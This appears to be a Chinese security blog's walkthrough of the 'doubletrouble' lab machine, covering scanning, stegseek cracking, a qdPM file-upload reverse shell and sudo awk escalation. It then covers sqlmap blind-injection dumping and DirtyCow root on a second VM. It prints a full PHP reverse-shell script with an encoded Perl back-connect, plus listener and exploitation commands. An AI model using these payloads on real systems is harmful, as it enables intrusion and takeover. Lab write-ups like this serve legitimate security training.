@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword" content="">
+    <meta name="theme-color" content="#600090">
+    <meta name="msapplication-navbutton-color" content="#600090">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
+    <link rel="shortcut icon" href="/img/marmot.jpg">
+    <link rel="alternate" type="application/atom+xml" title="marmot" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
+    <title>
+        
+        vulhub靶场-doubletrouble靶场渗透｜marmot&#39;s blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.marmot.vip/double/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/blog-style.css">
+
+
+    <!-- Pygments Github CSS -->
+    
+<link rel="stylesheet" href="/css/syntax.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<style>
+
+    header.intro-header {
+        background-image: url('img/back.jpg')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+" data-ishome = "false" >
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand animated pulse" href="/">
+                <span class="brand-logo">
+                    marmot
+                </span>
+                's Blog
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <!-- /.navbar-collapse -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+					
+                    
+                        
+							
+                        <li>
+                            <a href="/Tags/">Tags</a>
+                        </li>
+							
+						
+                    
+                        
+							
+                        <li>
+                            <a href="/work/">work</a>
+                        </li>
+							
+						
+                    
+					
+					
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+//    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+<!-- Main Content -->
+
+<!--only post-->
+
+
+<img class="wechat-title-img"
+     src="undefined/img/back7.jpg">
+
+
+<style>
+    
+    header.intro-header {
+        background-image: url('/img/back7.jpgundefined')
+    }
+
+    
+</style>
+
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <div class="post-heading">
+                    <h1>vulhub靶场-doubletrouble靶场渗透</h1>
+                    
+                    <h2 class="subheading">Hello World!</h2>
+                    
+                    <span class="meta">
+                         作者 二狗子
+                        <span>
+                          日期 2021-11-14
+                         </span>
+                    </span>
+                    <div class="tags text-center">
+                        
+                        <a class="tag" href="/tags/#websafe"
+                           title="websafe">websafe</a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="post-title-haojen">
+        <span>
+            vulhub靶场-doubletrouble靶场渗透
+        </span>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Container -->
+            <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
+                <h2 id="doubletrouble"><a href="#doubletrouble" class="headerlink" title="doubletrouble"></a>doubletrouble</h2><p>VULHUB靶场实验</p>
+<h2 id="实验工具："><a href="#实验工具：" class="headerlink" title="实验工具："></a>实验工具：</h2><p>fscan：端口扫描工具</p>
+<p>nmap：十分好用的端口扫描工具</p>
+<p>攻击机：<font color="red"><code>Kali Linux</code></font></p>
+<p>IP：<font color="red"><code>192.168.12.24</code></font></p>
+<p>目标机：<font color="red"><code>Debian</code></font></p>
+<p>IP：<font color="red"><code>192.168.12.158</code></font></p>
+<h2 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h2><h4 id="步骤1：获取目标IP地址"><a href="#步骤1：获取目标IP地址" class="headerlink" title="步骤1：获取目标IP地址"></a>步骤1：获取目标IP地址</h4><p>​    方法一：使用fscan 扫描一下ip段，获取目标ip为192.168.12.178</p>
+<p><img src="/double/image-20211022162158827.png" alt="image-20211022162158827"></p>
+<p>​    方法二：使用Advanced IP Scanner 扫描指定IP段内的机器</p>
+<p><img src="/double/image-20211022162138694.png" alt="image-20211022162138694"></p>
+<p>​    </p>
+<h4 id="步骤2：使用Nmap扫描目标开放端口"><a href="#步骤2：使用Nmap扫描目标开放端口" class="headerlink" title="步骤2：使用Nmap扫描目标开放端口"></a>步骤2：使用Nmap扫描目标开放端口</h4><p>​    使用nmap扫描192.168.12.158，发现开放了22、80端口</p>
+<p>​    <code>nmap -A -p- 192.168.12.158 -oN /root/桌面/doubletrouble.txt</code></p>
+<p>​    <img src="/double/image-20211022163553259.png" alt="image-20211022163553259"></p>
+<h4 id="步骤3：访问目标网站"><a href="#步骤3：访问目标网站" class="headerlink" title="步骤3：访问目标网站"></a>步骤3：访问目标网站</h4><p>​    浏览器访问192.168.12.158，发现一个Login页面</p>
+<p>​    <img src="/double/image-20211022162732808.png" alt="image-20211022162732808"></p>
+<p>​    尝试了弱口令没有效果，这个页面没有办法处理，使用dirsearch扫描目录</p>
+<blockquote>
+<p>用法：dirsearch -u [域名/IP地址] -o [导出文件路径]</p>
+</blockquote>
+<p>​    <code>dirsearch -u 192.168.12.158 -o /root/桌面/dir.txt </code></p>
+<p><img src="/double/image-20211022191439315.png" alt="image-20211022191439315"></p>
+<p>​    使用cat命令筛选出200响应码的路径</p>
+<p>​    <code>cat dir.txt | grep 200</code></p>
+<p>​    <img src="/double/image-20211022191555234.png" alt="image-20211022191555234"></p>
+<h4 id="步骤4：利用stegseek图片解密"><a href="#步骤4：利用stegseek图片解密" class="headerlink" title="步骤4：利用stegseek图片解密"></a>步骤4：利用stegseek图片解密</h4><p>​    在/secret/目录中有个比较奇怪的图片，将它保存到本地<img src="/double/image-20211022191657862.png" alt="image-20211022191657862"></p>
+<p>​    使用stegseek对图片进行解密</p>
+<blockquote>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">github：https:<span class="regexp">//gi</span>thub.com<span class="regexp">/RickdeJager/</span>stegseek/releases</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>​    kali自带了rockyou.txt，但是需要解压一下</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gunzip <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt.gz</span><br><span class="line">sudo stegseek .<span class="regexp">/doubletrouble.jpg /u</span>sr<span class="regexp">/share/</span>wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/double/image-20211022191902565.png" alt="image-20211022191902565"></p>
+<p>​    使用cat查看解密出的文件，得出账号密码</p>
+<pre><code>otisrush@localhost.como
+tis666   `
+</code></pre>
+<p><img src="/double/image-20211022191951620.png" alt="image-20211022191951620"></p>
+<p>​    进入之前的登录窗口尝试登录一下，登录成功<img src="/double/image-20211022192102168.png" alt="image-20211022192102168"></p>
+<p>​    之前在翻目录的时候看到install写着qdPM 9.1</p>
+<p><img src="/double/image-20211022192315499.png" alt="image-20211022192315499"></p>
+<h2 id="qdPM漏洞利用"><a href="#qdPM漏洞利用" class="headerlink" title="qdPM漏洞利用"></a>qdPM漏洞利用</h2><h4 id="步骤6：php反弹shell"><a href="#步骤6：php反弹shell" class="headerlink" title="步骤6：php反弹shell"></a>步骤6：php反弹shell</h4><p>​    发现就是用户的myAccount界面的图片那一栏是可以上传文件的，我们上传一个php反弹shell的脚本</p>
+<p>​    <strong>PHP反弹shell脚本：</strong></p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function which($pr) &#123;</span><br><span class="line">$path = <span class="built_in">execute</span>(<span class="string">&quot;which $pr&quot;</span>)<span class="comment">;</span></span><br><span class="line"><span class="keyword">return</span> ($path ? $path : $pr)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">function <span class="built_in">execute</span>($cfe) &#123;</span><br><span class="line">$res = <span class="string">&#x27;&#x27;</span><span class="comment">;</span></span><br><span class="line"><span class="keyword">if</span> ($cfe) &#123;</span><br><span class="line"><span class="keyword">if</span>(function_exists(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line"><span class="symbol">@exec</span>($cfe,$res)<span class="comment">;</span></span><br><span class="line">$res = join(<span class="string">&quot;\n&quot;</span>,$res)<span class="comment">;</span></span><br><span class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">$res = <span class="symbol">@shell_exec</span>($cfe)<span class="comment">;</span></span><br><span class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line"><span class="symbol">@ob_start</span>()<span class="comment">;</span></span><br><span class="line"><span class="symbol">@system</span>($cfe)<span class="comment">;</span></span><br><span class="line">$res = <span class="symbol">@ob_get_contents</span>()<span class="comment">;</span></span><br><span class="line"><span class="symbol">@ob_end_clean</span>()<span class="comment">;</span></span><br><span class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line"><span class="symbol">@ob_start</span>()<span class="comment">;</span></span><br><span class="line"><span class="symbol">@passthru</span>($cfe)<span class="comment">;</span></span><br><span class="line">$res = <span class="symbol">@ob_get_contents</span>()<span class="comment">;</span></span><br><span class="line"><span class="symbol">@ob_end_clean</span>()<span class="comment">;</span></span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="symbol">@is_resource</span>($f = <span class="symbol">@popen</span>($cfe,<span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line">$res = <span class="string">&#x27;&#x27;</span><span class="comment">;</span></span><br><span class="line"><span class="keyword">while</span>(!<span class="symbol">@feof</span>($f)) &#123;</span><br><span class="line">$res .= <span class="symbol">@fread</span>($f,<span class="number">1024</span>)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="symbol">@pclose</span>($f)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $res<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">function cf($fname,$text)&#123;</span><br><span class="line"><span class="keyword">if</span>($fp=<span class="symbol">@fopen</span>($fname,<span class="string">&#x27;w&#x27;</span>)) &#123;</span><br><span class="line"><span class="symbol">@fputs</span>($fp,<span class="symbol">@base64_decode</span>($text))<span class="comment">;</span></span><br><span class="line"><span class="symbol">@fclose</span>($fp)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$yourip = <span class="string">&quot;your IP&quot;</span><span class="comment">;</span></span><br><span class="line">$yourport = <span class="string">&#x27;your port&#x27;</span><span class="comment">;</span></span><br><span class="line">$usedb = array(<span class="string">&#x27;perl&#x27;</span>=&gt;<span class="string">&#x27;perl&#x27;</span>,<span class="string">&#x27;c&#x27;</span>=&gt;<span class="string">&#x27;c&#x27;</span>)<span class="comment">;</span></span><br><span class="line">$back_connect=<span class="string">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;</span>.</span><br><span class="line"><span class="string">&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;</span>.</span><br><span class="line"><span class="string">&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;</span>.</span><br><span class="line"><span class="string">&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;</span>.</span><br><span class="line"><span class="string">&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;</span>.</span><br><span class="line"><span class="string">&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;</span>.</span><br><span class="line"><span class="string">&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;</span><span class="comment">;</span></span><br><span class="line">cf(<span class="string">&#x27;/tmp/.bc&#x27;</span>,$back_connect)<span class="comment">;</span></span><br><span class="line">$res = <span class="built_in">execute</span>(which(<span class="string">&#x27;perl&#x27;</span>).<span class="string">&quot; /tmp/.bc $yourip $yourport &amp;&quot;</span>)<span class="comment">;</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传shell脚本地址：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.xxx.xxx<span class="regexp">/index.php/my</span>Account</span><br></pre></td></tr></table></figure>
+
+<p><img src="/double/image-20211022193246249.png" alt="image-20211022193246249"></p>
+<p>​    上传成功后，在kali中开启监听</p>
+<p>​    <code>nc -lnvp 4444</code></p>
+<p>​    <img src="/double/image-20211022193338295.png" alt="image-20211022193338295"></p>
+<p>​    打开uploads/users中有我们上传到的php脚本，点击php开始执行，shell反弹成功</p>
+<p>​    <img src="/double/image-20211022193545670.png" alt="image-20211022193545670"></p>
+<p>​    使用python改成伪交互式的shell</p>
+<p>​    <code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
+<p>​    <img src="/double/image-20211022193920424.png" alt="image-20211022193920424"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>​    </p>
+<p>​    查看当前用户能使用sudo的权限 ，可免密执行awk命令</p>
+<p>​    <img src="/double/image-20211022194739519.png" alt="image-20211022194739519"></p>
+<p>​    awk命令可以进行提权</p>
+<p>​    <code>sudo awk &#39;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#39;</code></p>
+<p>​    <img src="/double/image-20211022201042933.png" alt="image-20211022201042933"></p>
+<p>​    进入root目录，ls查看一下，下载doubletrouble.ova</p>
+<p>​    <img src="/double/image-20211022201850780.png" alt="image-20211022201850780"></p>
+<p>​    首先查看一下是否有python3环境</p>
+<p>​    <code>python3 -V</code></p>
+<p>​    <img src="/double/image-20211022202714437.png" alt="image-20211022202714437"></p>
+<p>​    使用python3开启一个http服务，然后从本地下载doubeltrouble.ova导入</p>
+<p>​    <code>python3 -m http.server 8888</code></p>
+<p><img src="/double/image-20211022202648058.png" alt="image-20211022202648058"></p>
+<p><img src="/double/image-20211022202817305.png" alt="image-20211022202817305"></p>
+<p>​    导入后扫描一下ip</p>
+<blockquote>
+<p>目标IP地址：192.168.12.58</p>
+</blockquote>
+<p><img src="/double/image-20211022205106315.png" alt="image-20211022205106315"></p>
+<p>​    使用nmap扫描一下开放端口</p>
+<p>​    <code>nmap -A -p- 192.168.12.58</code></p>
+<p><img src="/double/image-20211022210136685.png" alt="image-20211022210136685"></p>
+<p>​    开放端口22、80</p>
+<p>​    访问80端口，发现是一个登录界面</p>
+<p>​    <img src="/double/image-20211022210925530.png" alt="image-20211022210925530"></p>
+<p>​    尝试使用万能密码，测试是否存在注入</p>
+<p>​    使用burp抓包，导出为txt文件，使用sqlmap测试</p>
+<p>​    <img src="/double/image-20211022211235472.png" alt="image-20211022211235472"></p>
+<p>​    <img src="/double/image-20211022211347686.png" alt="image-20211022211347686"></p>
+<p><img src="/double/image-20211022211538042.png" alt="image-20211022211538042"></p>
+<pre><code> sqlmap跑出 uname存在时间延时盲注
+</code></pre>
+<p>​    使用sqlmap跑用户名</p>
+<p>​    <code>python3 sqlmap.py -r /root/桌面/sql.txt -D doubletrouble -T users -C username --dump --batch --threads 10</code></p>
+<p>​    <img src="/double/image-20211022212640708.png" alt="image-20211022212640708"></p>
+<p>​    sqlmap跑密码</p>
+<p>​    <code>python3 sqlmap.py -r /root/桌面/sql.txt -D doubletrouble -T users -C password --dump --batch --threads 10</code></p>
+<p>​    <img src="/double/image-20211022213344601.png" alt="image-20211022213344601"></p>
+<p>​    尝试在网站上登录，两个都不好使，尝试使用ssh登录</p>
+<p>​    <img src="/double/image-20211022214311920.png" alt="image-20211022214311920"></p>
+<p>​    登陆成功，查看系统版本内核</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname -r</span><br><span class="line">uname -<span class="selector-tag">a</span></span><br><span class="line">得到版本是<span class="number">3.2</span>.<span class="number">0</span>-<span class="number">4</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/double/image-20211022214436791.png" alt="image-20211022214436791"></p>
+<p>​    使用<code>cat /etc/*-release</code>看到是Debian 7系统</p>
+<p><img src="/double/image-20211022214642153.png" alt="image-20211022214642153"></p>
+<p>​    Debian 7系统可以通过脏牛提权</p>
+<blockquote>
+<p>github:<a target="_blank" rel="noopener" href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
+<p>​    <img src="/double/image-20211022214856123.png" alt="image-20211022214856123"></p>
+</blockquote>
+<p>​    在靶机上<code>gcc -v</code> 查看是否有gcc编译环境</p>
+<p><img src="/double/image-20211022215047970.png" alt="image-20211022215047970"></p>
+<p>​    传到目标靶机上，然后进行编译</p>
+<p><code>scp /root/桌面/内网工具/脏牛/dirtycow/dirty.c clapton@192.168.12.58:/tmp </code><img src="/double/image-20211022215157188.png" alt="image-20211022215157188"></p>
+<p>​    <code>gcc -pthread dirty.c -o dirty -lcrypt</code> </p>
+<p><img src="/double/image-20211022215311781.png" alt="image-20211022215311781"></p>
+<p>​    然后去执行dirty</p>
+<p>​    <img src="/double/image-20211022215345404.png" alt="image-20211022215345404"></p>
+<p>​    <code>su firefart</code></p>
+<p>​    登录到firefart上</p>
+<p><img src="/double/image-20211022215539698.png" alt="image-20211022215539698">    </p>
+<p>​    成功获取到root权限以及flag</p>
+<blockquote>
+<p>flag:1B8EEA89EA92CECB931E3CC25AA8DE21</p>
+</blockquote>
+<h1 id="转载：biuergouzi-cn"><a href="#转载：biuergouzi-cn" class="headerlink" title="转载：biuergouzi.cn/"></a>转载：biuergouzi.cn/</h1>
+                <hr>
+                
+
+                <ul class="pager">
+                    
+                    
+                    <li class="next">
+                        <a href="/typecho/" data-toggle="tooltip" data-placement="top"
+                           title="typecho反序列化漏洞复现">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+
+                
+
+
+                <!--加入新的评论系统-->
+                
+
+                
+                    <!-- Valine -->
+                    <div class="vcomments"></div>
+                    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+                    <script src="//cdn.jsdelivr.net/npm/valine"></script>
+                    <script>
+                        var GUEST = ['nick','mail','link'];
+                        var meta = '';
+                        meta = meta.split(',').filter(function (item) {
+                            return GUEST.indexOf(item)>-1;
+                        });
+                        var notify = 'false' == true ? true : false;
+                        var verify = 'false' == true ? true : false;
+                        new Valine({
+                            el: '.vcomments',
+                            notify: notify,
+                            verify: verify,
+                            app_id: "oE8RJ9DO5Tl7ChTtMFwgLKIg-gzGzoHsz",
+                            app_key: "mUbPBB3Wq3R6wX9ysIlescWj",
+                            placeholder: "评论一下",
+                            avatar:"mm",
+                            meta:meta
+                        });
+                    </script>
+                
+
+            </div>
+
+            <div class="hidden-xs col-sm-3 toc-col">
+                <div class="toc-wrap">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#doubletrouble"><span class="toc-text">doubletrouble</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%B7%A5%E5%85%B7%EF%BC%9A"><span class="toc-text">实验工具：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-text">实验步骤：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87IP%E5%9C%B0%E5%9D%80"><span class="toc-text">步骤1：获取目标IP地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E4%BD%BF%E7%94%A8Nmap%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3"><span class="toc-text">步骤2：使用Nmap扫描目标开放端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43%EF%BC%9A%E8%AE%BF%E9%97%AE%E7%9B%AE%E6%A0%87%E7%BD%91%E7%AB%99"><span class="toc-text">步骤3：访问目标网站</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A44%EF%BC%9A%E5%88%A9%E7%94%A8stegseek%E5%9B%BE%E7%89%87%E8%A7%A3%E5%AF%86"><span class="toc-text">步骤4：利用stegseek图片解密</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qdPM%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">qdPM漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A46%EF%BC%9Aphp%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">步骤6：php反弹shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BD%AC%E8%BD%BD%EF%BC%9Abiuergouzi-cn"><span class="toc-text">转载：biuergouzi.cn&#x2F;</span></a>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5 class="text-center">
+                        <a href="/tags/">FEATURED TAGS</a>
+                    </h5>
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#websafe"
+                           title="websafe">websafe</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <div style="margin-top: 20px;">
+                    <h5 class="text-center">FRIENDS</h5>
+                    <ul class="list-inline text-center">
+                        
+                        <li><a target="_blank" rel="noopener" href="https://www.zerochen.top">墨的博客</a></li>
+                        
+                        <li><a target="_blank" rel="noopener" href="https://www.sunflowers.vip">sunflowers的博客</a></li>
+                        
+                    </ul>
+                </div>
+                
+            </div>
+        </div>
+
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- Footer -->
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <br>
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/mar-mot">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; marmot 2021
+                    <br>
+                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
+                    <br>
+                    Theme by <a target="_blank" rel="noopener" href="https://haojen.github.io/">Haojen Ma</a>
+                </p>
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/js/blog.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.marmot.vip/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','','2.0.0');
+</script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!--wechat title img-->
+<img class="wechat-title-img" src="/img/marmot.jpg">
+</body>
+
+</html>
